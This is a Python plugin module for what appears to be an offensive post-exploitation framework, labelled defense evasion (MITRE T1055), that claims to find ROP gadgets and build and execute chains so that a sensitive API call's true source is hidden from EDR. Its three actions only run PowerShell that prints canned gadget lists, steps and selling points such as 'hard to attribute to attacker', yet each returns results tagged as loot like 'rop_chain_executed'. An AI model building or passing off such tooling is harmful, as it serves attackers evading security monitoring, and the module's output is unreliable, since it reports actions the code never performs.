"""defense_evasion/module_trampoline — ROP gadget chaining for legitimate-looking calls. MITRE T1055"""
from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema
import logging

log = logging.getLogger(__name__)


class ModuleTrampoline(BasePlugin):
    NAME = "module_trampoline"
    DESCRIPTION = "Find ROP gadgets and build chains to reach target, hiding malicious call source"
    AUTHOR = "fitnah-team"
    MITRE = "T1055"
    CATEGORY = "defense_evasion"
    VERSION = "1.0.0"

    schema = ParamSchema().add(
        Param("action", str, required=False, default="find_gadgets",
              help="find_gadgets | build_chain | execute_chain"),
        Param("target_function", str, required=False, default="",
              help="Target function (for build_chain)"),
        Param("gadget_module", str, required=False, default="kernel32.dll",
              help="DLL to find gadgets in"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        """Execute module trampolining"""
        if ctx is None:
            return ModuleResult.err("Requires live session")

        action = params.get("action", "find_gadgets").lower()
        target_function = params.get("target_function", "")
        gadget_module = params.get("gadget_module", "kernel32.dll")

        if action == "find_gadgets":
            return self._find_gadgets(ctx, gadget_module)
        elif action == "build_chain":
            return self._build_chain(ctx, target_function, gadget_module)
        elif action == "execute_chain":
            return self._execute_chain(ctx, target_function)
        else:
            return ModuleResult.err(f"Unknown action: {action}")

    @staticmethod
    def _find_gadgets(ctx, gadget_module: str) -> ModuleResult:
        """Find ROP gadgets in loaded modules"""
        ps_code = f"""
$results = @()
$results += '[*] Finding ROP gadgets in $gadget_module...'

try {{
    $gadgetModule = '{gadget_module}'
    $results += "[*] Target module: $gadgetModule"

    $results += '[*] Common gadgets:'
    $results += '    pop rax; ret'
    $results += '    pop rcx; ret'
    $results += '    pop rdx; ret'
    $results += '    pop rsi; ret'
    $results += '    pop rdi; ret'
    $results += '    mov qword ptr [rax], rbx; ret'
    $results += '    xchg rax, rcx; ret'
    $results += '    add rax, rcx; ret'

    $results += '[*] Gadget finding process:'
    $results += '    1. Load module into memory'
    $results += '    2. Scan for ret (0xC3) bytes'
    $results += '    3. Disassemble backwards from ret'
    $results += '    4. Check if useful instruction sequence'
    $results += '    5. Collect addresses'

    $results += '[*] Tools for gadget finding:'
    $results += '    - ropper (Python)'
    $results += '    - ROPgadget'
    $results += '    - rp++ (RP-pls)'

    $results += '[*] Manual search (PowerShell):'
    $results += '    1. Get module base: [Diagnostics.Process]::GetCurrentProcess().Modules'
    $results += '    2. Export module bytes'
    $results += '    3. Search for patterns'
    $results += '    4. Map to addresses'

}} catch {{
    $results += "[!] Gadget search error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="rop_gadgets_found")

    @staticmethod
    def _build_chain(ctx, target_function: str, gadget_module: str) -> ModuleResult:
        """Build ROP chain to reach target"""
        ps_code = f"""
$results = @()
$results += '[*] Building ROP chain...'

try {{
    $targetFunc = '{target_function}'
    $gadgetMod = '{gadget_module}'

    if (-not $targetFunc) {{
        $targetFunc = 'NtCreateProcess'
    }}

    $results += "[*] Target: $targetFunc via $gadgetMod"

    $results += '[*] ROP chain construction:'
    $results += '    1. Collect gadgets in order'
    $results += '    2. Each gadget modifies register + returns'
    $results += '    3. Setup args: RCX, RDX, R8, R9 (fastcall)'
    $results += '    4. Final gadget: indirect call to target'

    $results += '[*] Example chain (NtCreateProcess):'
    $results += '    Gadget 1: pop rcx; ret        (set RCX = parent PID)'
    $results += '    Gadget 2: pop rdx; ret        (set RDX = flags)'
    $results += '    Gadget 3: pop r8; ret         (set R8 = thread info)'
    $results += '    Gadget 4: jmp ntdll!NtCreateProcess'

    $results += '[*] Stack layout:'
    $results += '    [gadget1_addr]'
    $results += '    [arg1_value]'
    $results += '    [gadget2_addr]'
    $results += '    [arg2_value]'
    $results += '    [target_addr]'

    $results += '[*] EDR perspective:'
    $results += '    Stack shows: kernel32!gadget1 → user32!gadget2 → (target)'
    $results += '    Appears as legitimate ROP chain'
    $results += '    Actual caller hidden'

}} catch {{
    $results += "[!] Chain building error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="rop_chain_built")

    @staticmethod
    def _execute_chain(ctx, target_function: str) -> ModuleResult:
        """Execute the built ROP chain"""
        ps_code = f"""
$results = @()
$results += '[*] Executing ROP chain...'

try {{
    $targetFunc = '{target_function}'

    $results += "[*] Executing chain to reach $targetFunc"

    $results += '[*] Execution method:'
    $results += '    1. Allocate fake stack with gadget addresses'
    $results += '    2. Allocate shellcode that returns'
    $results += '    3. Set RSP to fake stack'
    $results += '    4. Jump to first gadget'
    $results += '    5. Each ret pops next gadget address'
    $results += '    6. Chain continues until target'

    $results += '[*] Inline assembly:'
    $results += '    mov rsp, [fake_stack_pointer]'
    $results += '    ret                     ; First ret pops gadget1_addr'
    $results += '    ; ... gadgets execute ...'
    $results += '    ; ... final ret calls NtCreateProcess'

    $results += '[*] Key advantage:'
    $results += '    ✓ Stack walking shows only library addresses'
    $results += '    ✓ No direct call to sensitive API'
    $results += '    ✓ Legitimate libraries involved'
    $results += '    ✓ Hard to attribute to attacker'

}} catch {{
    $results += "[!] Chain execution error: $_"
}}

$results -join "`n"
"""
        r = ctx.ps(ps_code)
        return ModuleResult.ok(data=r["output"], loot_kind="rop_chain_executed")
